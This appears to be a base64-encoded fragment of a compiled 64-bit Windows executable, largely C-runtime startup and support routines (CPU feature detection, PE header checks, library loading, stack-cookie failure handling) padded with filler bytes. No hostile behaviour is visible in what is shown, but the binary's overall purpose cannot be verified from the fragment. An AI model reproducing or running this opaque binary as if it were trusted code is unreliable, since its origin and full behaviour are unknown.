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zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAP/gzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM